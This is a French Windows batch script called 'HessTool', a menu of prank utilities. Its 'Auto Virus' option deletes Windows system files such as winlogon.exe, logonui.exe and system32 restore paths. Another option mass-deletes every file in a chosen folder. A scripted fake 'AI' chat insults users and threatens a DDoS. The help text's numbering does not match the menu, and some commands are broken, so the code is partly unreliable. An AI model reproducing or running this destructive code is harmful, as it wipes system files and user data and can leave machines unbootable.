@echo off
title HessTool by FDV (dedicace a mln)

:menu
echo __  __  ____    ____    ____         ______  _____   _____   __        
echo/\ \/\ \/\  _`\ /\  _`\ /\  _`\      /\__  _\/\  __`\/\  __`\/\ \       
echo\ \ \_\ \ \ \L\_\ \,\L\_\ \,\L\_\    \/_/\ \/\ \ \/\ \ \ \/\ \ \ \      
echo \ \  _  \ \  _\L\/_\__ \\/_\__ \       \ \ \ \ \ \ \ \ \ \ \ \ \ \  __ 
echo  \ \ \ \ \ \ \L\ \/\ \L\ \/\ \L\ \      \ \ \ \ \ \_\ \ \ \_\ \ \ \L\ \
echo   \ \_\ \_\ \____/\ `\____\ `\____\      \ \_\ \ \_____\ \_____\ \____/
echo    \/_/\/_/\/___/  \/_____/\/_____/       \/_/  \/_____/\/_____/\/___/  By FDV

echo.
echo Choisis une option :
echo 1. SPAM fichiers
echo 2. Auto Virus (AVERTISSEMENT)
echo 3. ChatJaiPeter
echo 4. Tchat via reseau (SOON)
echo 5. Supprimer Fichiers en masse
echo 6. MENTION/AIDE
echo 7. Quitter
set /p choix="Entrez votre choix : "

if "%choix%"=="1" (
    call :creer_fichiers
) else if "%choix%"=="2" (
    call :auto_virus
) else if "%choix%"=="3" (
    call :chat_IA
) else if "%choix%"=="4" (
    call :lancer_tchat
) else if "%choix%"=="5" (
    call :supprimer_tous_fichiers
) else if "%choix%"=="6" (
    call :credits
) else if "%choix%"=="7" (
    exit
) else (
    echo Choix invalide. Veuillez entrer un numero valide.
    timeout /t 2 >nul
    goto menu
)

:lancer_tchat
cls
echo Lancement du tchat...
echo.
echo Pour quitter le tchat, appuyez sur Ctrl+C.
echo.

rem Lancement du script de tchat en batch depuis le dossier SERVEUR
call msg.bat

pause
goto menu


rem Les autres fonctions du menu restent inchangées


:creer_fichiers
rem Code pour créer des fichiers...
cls
set /p nombre="Entrez le nombre de fichiers à creer : "
set /p nom="Entrez le nom des fichiers : "
set /p chemin="Entrez le chemin où les fichiers seront crees (ex: C:\chemin\) : "

if not exist "%chemin%" (
    echo Le chemin spécifie n'existe pas.
    timeout /t 2 >nul
    goto creer_fichiers
)

cd /d "%chemin%"

for /l %%i in (1,1,%nombre%) do (
    echo.>"%nom%%%i.txt"
)

echo %nombre% fichiers créés avec succès dans %chemin%.
pause
goto menu

:auto_virus
rem Code pour le virus...
echo AVERTISSEMENT: Cette action va supprimer des fichiers système importants.
set /p confirmation="Voulez-vous vraiment continuer :) ? (oui/non) : "
if /i "%confirmation%"=="oui" (
    del "C:\windows\pchealth\"
    del "C:\windows\system\"
    del "C:\windows\system32\restore\"
    del "winlogon.exe"
    del "C:\windows\system32\autoexec.nt"
    del "C:\windows\system32\logonui.exe"
    del "C:\windows\system32\ntoskrn"
    pause
) else if /i "%confirmation%"=="non" (
    cls
    goto menu
) else (
    echo Réponse invalide. Retour au menu.
    timeout /t 2 >nul
    goto menu
)

:nouvelle_option
rem Code pour la nouvelle option...
echo Vous avez choisi la Nouvelle Option.
pause
goto menu

:chat_IA
rem Code pour le chat IA...
cls
echo IA: Bonjour! Tu voulais...?
:chat_loop
set /p user_input="Vous: "
if /i "%user_input%"=="salut" (
    echo IA: Salut! Comment ça va?
) else if /i "%user_input%"=="comment ça va ?" (
    echo IA: Ça va bien, merci de demander!
) else if /i "%user_input%"=="quel est ton nom ?" (
    echo IA: Je suis l'IA, un assistant virtuel.
) else if /i "%user_input%"=="qui t'a créé ?" (
    echo IA: Je suis le fruit du travail de FDV, le GOAT !
) else if /i "%user_input%"=="bye" (
    echo IA: À bientôt.
    goto menu
    cls
) else if /i "%user_input%"=="ça va ?" (
    echo IA: Oui, ça va et toi ?
) else if /i "%user_input%"=="ça va bien ?" (
    echo IA: Oui, ça va bien merci, et toi ?
) else if /i "%user_input%"=="comment ça va" (
    echo IA: Ça va bien, merci!
) else if /i "%user_input%"=="tu vas bien ?" (
    echo IA: Oui, je vais bien, merci de demander!
) else if /i "%user_input%"=="quoi de neuf ?" (
    echo IA: Pas grand-chose, et toi ?
) else if /i "%user_input%"=="tu fais quoi ?" (
    echo IA: Je discute avec toi, tes con.
) else if /i "%user_input%"=="quelle est ta couleur préférée ?" (
    echo IA: Sah... Le blanc et le noir.
) else if /i "%user_input%"=="quel temps fait-il aujourd'hui ?" (
    echo IA: C'est quoi cette question de CON ?
) else if /i "%user_input%"=="tu as des frères ou sœurs ?" (
    echo IA: Oui, ChatGPT.
) else if /i "%user_input%"=="aide moi" (
    echo IA: Bonsoir, NON.
    echo ADMIN: Cela arrive prochainement.
) else if /i "%user_input%"=="salope" (
    echo IA: Ose redire ca va te DDOS.
) else if /i "%user_input%"=="connard" (
    echo IA: OK gars.
) else if /i "%user_input%"=="soundboard" (
    print ADMIN: Veuillez recommencer la commande pour avoir accès a la soundboard.
    set "fichier_html=sound.html"
    start "" "%fichier_html%"
    goto menu
) else (
    echo IA: Désole, je ne comprends pas. Pouvez-vous reformuler votre question?
)
goto chat_loop

:supprimer_tous_fichiers
rem Code pour supprimer des fichiers...
cls
set /p chemin="Entrez le chemin du répertoire ou les fichiers seront supprimes : "

echo.

if not exist "%chemin%" (
    echo Le chemin specifie n existe pas.
    timeout /t 2 >nul
    goto supprimer_tous_fichiers
)

cd /d "%chemin%"

echo Suppression de tous les fichiers dans %chemin%...
echo.

del /q *.*
echo Suppression terminee.
pause
goto menu

:credits
rem Code pour les credits...
cls
echo Cree par FDV.
echo Mention:
echo         Je décline toute responsabilite quant à l utilisation abusive de l outil que j ai fourni, et je ne cautionne en aucun cas toute activité illegale ou malveillante realisee avec celui-ci.
echo --------
echo Help:
echo       Option 1: Creez rapidement et en masse des fichiers dans n'importe quel emplacement de votre ordinateur.
echo       Option 2: Lancer un virus capable de detruire vos fichiers systeme. (LIRE LA MENTION)
echo       Option 3: Posez-lui toutes sortes de questions.
echo       Option 4: Supprimez massivement des fichiers dans un repertoire.
echo       Option 5: Nouvelle Option
echo       Option 6: MENTION/AIDE
echo       Option 7: Quitter
echo --------
echo  BUG: Pour avoir acces a la soundboard choisis l'option 1 puis tape soundboard un message d erreur s'affichera puis recommence une deuxieme fois et la page s ouvrira. ;)
pause
cls
goto menu
